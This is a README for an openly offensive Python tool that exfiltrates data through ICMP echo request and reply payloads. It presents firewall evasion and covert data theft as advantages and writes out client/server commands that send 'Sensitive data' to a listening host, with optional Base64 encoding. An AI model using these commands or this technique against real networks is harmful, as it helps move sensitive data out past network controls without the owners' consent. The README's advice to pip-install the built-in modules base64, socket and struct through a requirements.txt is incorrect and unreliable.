# ICMP-Tool
This tool is a Python-based ICMP exfiltration tool designed to send and receive data through ICMP (Internet Control Message Protocol)

## How ICMP Exfiltration Works

ICMP (Internet Control Message Protocol) is typically used for sending error messages and operational information, such as in the **ping** command. However, ICMP can also be used for data exfiltration by embedding data within ICMP echo request and reply messages.

### Steps of ICMP Exfiltration:

1. **ICMP Echo Request:**
   - The client sends an ICMP **Echo Request** message to the server, similar to how the `ping` command works.
   - Data is embedded in the request packet as the payload.

2. **ICMP Echo Reply:**
   - The server responds with an **Echo Reply**, typically containing the same payload.
   - The data from the echo request is received and processed on the server.

### Advantages:
- ICMP packets often pass through firewalls and network filters because ICMP is commonly allowed for diagnostic purposes.
- Since ICMP is lightweight and commonly used, it can be leveraged to covertly exfiltrate small amounts of data.

## How to Use the Script

### Prerequisites:
- **Python 3.x** is required.
- Admin privileges are necessary to create raw sockets for ICMP communication.

### Script Features:

- **Base64 Encoding (`--b64` flag)**: You can encode messages in Base64 to safely transmit special characters.
- **Cross-Platform**: The script works on both Linux and Windows.
- **Client/Server Mode**: Use the `--client` flag to send ICMP packets or the `--server` flag to listen for ICMP packets.

### Script Usage

1. **Server Mode** (to receive data):
   ```bash
   sudo python3 icmp_tool.py --server
   ```

2. **Client Mode** (to send data):
   **Without Base64 Encoding**:
     ```bash
     sudo python3 icmp_tool.py --client <server_ip> "<message>"
     ```
   **With Base64 Encoding**:
     ```bash
     sudo python3 icmp_tool.py --client <server_ip> "<message>" --b64
     ```

### Example Workflow:

1. **Start the server** on a machine (e.g., IP: 192.168.1.87):
   ```bash
   sudo python3 icmp_tool.py --server
   ```

2. **Send a message** from the client machine:
   ```bash
   sudo python3 icmp_tool.py --client 192.168.1.87 "Sensitive data"
   ```

3. **Send a Base64-encoded message** from the client machine:
   ```bash
   sudo python3 icmp_tool.py --client 192.168.1.87 "Sensitive data" --b64
   ```

### Understanding the Output:

- The **server** will show received ICMP packets and display whether the message was Base64 encoded.
- If `--b64` is used, the server will display both the encoded and decoded messages.

### Cross-Platform Execution:

- On **Linux**, run the script with `sudo`:
   ```bash
   sudo python3 icmp_tool.py --client <server_ip> "<message>"
   sudo python3 icmp_tool.py --server
   ```

- On **Windows**, execute the script from a command prompt **run as Administrator**:
   ```cmd
   python icmp_tool.py --client <server_ip> "<message>"
   python icmp_tool.py --server
   ```

## Installing Dependencies

This script uses built-in Python libraries like `socket`, `base64`, and `struct`. There are no external dependencies. However, to ensure proper execution, especially if you are planning to add more functionalities, you can create a `requirements.txt` file for package management.

## `requirements.txt`

If needed, create the following `requirements.txt` file:

```text
base64
socket
struct
```

### Installing dependencies:

To install dependencies from the `requirements.txt` file, use:
```bash
pip install -r requirements.txt
```

This will ensure that all necessary modules are available for running the script.

## Conclusion

This script leverages ICMP echo request and reply messages for data exfiltration. By embedding sensitive data within ICMP packets, attackers can potentially bypass network filters. The script supports both plain and Base64-encoded message transmission, and works on both Windows and Linux. Use it carefully for testing and demonstration purposes!
